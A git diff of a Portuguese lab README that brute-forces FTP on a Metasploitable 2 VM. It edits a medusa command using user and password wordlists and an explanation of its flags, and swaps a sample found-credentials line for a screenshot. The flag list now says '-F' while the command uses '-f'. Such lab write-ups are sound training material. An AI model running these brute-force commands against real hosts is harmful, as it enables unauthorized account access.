@@ -114,7 +114,7 @@ ping -c 4 192.168.1.114
 ```
 <img width="729" height="618" alt="01-configuracao-rede" src="https://github.com/user-attachments/assets/20028553-4d91-4a8f-a7d1-1b674817da38" />
 
-📸 *`01-configuracao-rede.png`*
+
 
 ---
 
@@ -137,7 +137,7 @@ Isso confirma que FTP (21), SMB (139/445) e HTTP (80) estão ativos.
 
 <img width="728" height="647" alt="02 - namap - scan" src="https://github.com/user-attachments/assets/86aa98dd-6aca-4b8b-973c-6f1f6beff31a" />
 
-📸 *`02-nmap-scan.png`*
+
 
 ---
 
@@ -183,23 +183,19 @@ ls -lh /usr/share/wordlists/rockyou.txt
 O Metasploitable 2 roda o **vsftpd** na porta 21.
 
 ```bash
-medusa -h 192.168.1.114 \
-       -U wordlists/usuarios.txt \
-       -P wordlists/senhas.txt \
-       -M ftp \
-       -t 4 \
-       -f
+medusa -h 192.168.1.114 -U usuarios.txt -P senhas.txt -M ftp -t 6 -f
 ```
 
 - `-U` lista de usuários
 - `-P` lista de senhas
 - `-M ftp` módulo FTP
-- `-t 4` quatro tentativas simultâneas
-- `-f` para ao encontrar a primeira credencial válida
+- `-t 6` seis tentativas simultâneas
+- `-F` para ao encontrar a primeira credencial válida
 
 **Saída esperada (exemplo):**
 ```
-ACCOUNT FOUND: [ftp] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
+<img width="787" height="558" alt="image" src="https://github.com/user-attachments/assets/f8eb5b15-aba1-4f68-8567-3f6191de0c98" />
+
 ```
 
 ### Validação do acesso
